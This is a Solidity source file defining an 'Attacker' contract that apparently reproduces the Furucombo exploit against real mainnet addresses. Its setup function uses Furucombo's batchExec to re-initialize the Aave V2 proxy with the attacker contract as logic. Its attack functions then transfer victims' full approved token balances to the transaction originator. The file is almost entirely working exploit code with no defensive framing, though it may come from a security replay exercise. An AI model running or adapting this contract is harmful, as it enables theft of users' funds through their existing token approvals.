//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;
import "./interfaces/IERC20.sol";
import "hardhat/console.sol";

interface IAttacker {
    function setup() external payable;

    function attack(IERC20 token, address sender) external payable;

    function attackDelegated(IERC20, address) external payable;
}

interface IRegistry {
    function infos(address) external view returns (bytes32);

    function isValid(address handler) external view returns (bool result);
}

interface IProxy {
    function batchExec(
        address[] memory tos,
        bytes32[] memory configs,
        bytes[] memory datas
    ) external;
}

// https://etherscan.io/address/0x7d2768de32b0b80b7a3454c06bdac94a69ddc7a9#code
interface IAaveV2Proxy {
    function initialize(address _logic, bytes memory _data) external payable;
}

contract Attacker is IAttacker {
    IProxy public constant FURUCOMBO =
        IProxy(0x17e8Ca1b4798B97602895f63206afCd1Fc90Ca5f);
    IAaveV2Proxy public constant AAVE_V2_PROXY =
        IAaveV2Proxy(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);

    function setup() external payable {
        // https://ethtx.info/mainnet/0x6a14869266a1dcf3f51b102f44b7af7d0a56f1766e5b1908ac80a6a23dbaf449
        address[] memory tos = new address[](1);
        bytes32[] memory configs = new bytes32[](1);
        bytes[] memory datas = new bytes[](1);

        tos[0] = address(AAVE_V2_PROXY);
        datas[0] = abi.encodeWithSelector(
            AAVE_V2_PROXY.initialize.selector,
            address(this),
            ""
        );
        FURUCOMBO.batchExec(tos, configs, datas);
    }

    function attack(IERC20 token, address sender) external payable {
        address[] memory tos = new address[](1);
        bytes32[] memory configs = new bytes32[](1);
        bytes[] memory datas = new bytes[](1);
        tos[0] = address(AAVE_V2_PROXY);
        datas[0] = abi.encodeWithSelector(
            this.attackDelegated.selector,
            token,
            sender
        );
        FURUCOMBO.batchExec(tos, configs, datas);
    }

    function attackDelegated(IERC20 token, address sender) external payable {
        //tx.origin gives the origin of the transactions, so the user address it was originally sent from. In practice this will always be a user
        token.transferFrom(sender, tx.origin, token.balanceOf(sender)); // eslint-disable-line no-use-before-define
    }
}
